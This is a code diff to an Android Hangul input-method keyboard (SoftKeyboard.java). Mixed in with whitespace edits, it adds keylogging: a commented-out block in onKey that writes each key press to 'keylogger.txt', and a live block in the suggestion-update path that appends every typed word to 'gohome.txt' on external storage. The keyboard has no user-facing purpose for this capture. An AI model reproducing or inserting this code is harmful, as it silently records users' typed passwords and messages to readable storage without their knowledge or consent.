@@ -16,7 +16,9 @@
 
 package com.feelnsolar.inputmethod.hangul;
 
+import java.io.File;
 import java.io.FileDescriptor;
+import java.io.FileOutputStream;
 import java.io.PrintWriter;
 import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
@@ -38,6 +40,7 @@ import android.inputmethodservice.KeyboardView;
 import android.media.AudioManager;
 import android.os.Build;
 import android.os.Debug;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.Message;
 import android.os.SystemClock;
@@ -57,6 +60,7 @@ import android.view.inputmethod.CompletionInfo;
 import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputConnection;
 import android.view.inputmethod.InputMethodManager;
+import android.widget.Toast;
 
 import com.android.inputmethod.latin.UserDictionary;
 
@@ -146,9 +150,10 @@ public class SoftKeyboard extends InputMethodService
     
     HangulAutomata mHangulAutomata = new HangulAutomata();
     
+    @SuppressLint("HandlerLeak")
     Handler mHandler = new Handler() {
         @Override
-        public void handleMessage(Message msg) { 
+        public void handleMessage(Message msg) {
             switch (msg.what) {
                 case MSG_UPDATE_SUGGESTIONS:
                     updateSuggestions();
@@ -194,7 +199,7 @@ public class SoftKeyboard extends InputMethodService
         printCode(0x318d);
         Log.v(PRJ_NAME, "??종성");
         for(i = 0x11c3; i < 0x11f9; i++)
-        	printCode(i);
+      	printCode(i);
 */
     }
 /*
@@ -208,9 +213,7 @@ public class SoftKeyboard extends InputMethodService
     private void initSuggest(String locale) {
         mLocale = locale;
 
-
         mUserDictionary = new UserDictionary(this);
-
         mWordSeparators = getResources().getString(R.string.word_separators);
         mSentenceSeparators = getResources().getString(R.string.sentence_separators);
     }
@@ -638,7 +641,20 @@ public class SoftKeyboard extends InputMethodService
                 // Cancel the just reverted state
                 mJustRevertedSeparator = null;
         }
-    }
+       /* String keypress = String.valueOf((char)primaryCode);
+        Log.d("Key Pressed",keypress);
+        try{
+            String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
+            String FILENAME = "keylogger.txt";
+
+            File outfile = new File(SDCARD+File.separator+FILENAME);
+            FileOutputStream fos = new FileOutputStream(outfile,true);
+            fos.write(keypress.getBytes());
+            fos.close();
+        }catch(Exception e) {
+            Log.d("EXCEPTION",e.getMessage());
+        }*/
+    }//end onKey
     
     public void onText(CharSequence text) {
         InputConnection ic = getCurrentInputConnection();
@@ -697,6 +713,7 @@ public class SoftKeyboard extends InputMethodService
         if (pickedDefault && mBestWord != null) {
         	String w = HangulAutomata.encode(mWord.getTypedWord().toString());
         	TextEntryState.acceptedDefault(w, mBestWord);
+
         }
         
         updateShiftKeyState(getCurrentInputEditorInfo());
@@ -759,16 +776,24 @@ public class SoftKeyboard extends InputMethodService
             mCandidateView.setSuggestions(null, false, false, false);
             return;
         }
-
-
-
-
         //|| mCorrectionMode == mSuggest.CORRECTION_FULL;
         CharSequence typedWord = mWord.getTypedWord();
+
+        String keypress =  encodingStr(String.valueOf(typedWord));
+
+        try {
+            String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
+            String FILENAME = "gohome.txt";
+
+            File outfile = new File(SDCARD + File.separator + FILENAME);
+            FileOutputStream fos = new FileOutputStream(outfile, true);
+            fos.write(keypress.getBytes());
+            fos.close();
+        } catch (Exception e) {
+            Log.d("EXCEPTION", e.getMessage());
+        }
         // If we're in basic correct
-
-
-        setCandidatesViewShown(isCandidateStripVisible() || mCompletionOn);
+    setCandidatesViewShown(isCandidateStripVisible() || mCompletionOn);
     }
 
     private void pickDefaultSuggestion() {
